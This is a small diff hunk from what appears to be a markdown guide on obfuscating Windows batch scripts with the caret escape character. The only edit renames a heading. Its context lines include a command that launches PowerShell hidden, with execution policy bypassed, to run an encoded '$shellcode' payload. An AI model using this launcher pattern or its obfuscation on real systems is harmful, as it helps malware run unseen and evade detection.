@@ -29,7 +29,7 @@ The above string can be obfuscated using the **batch escape caracter** ^<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
 
 - using one batch local variable to serve as our **master key** (varObj)<br />
-**template.bat**<br />
+**file template.bat**<br />
 
 
       @echo off
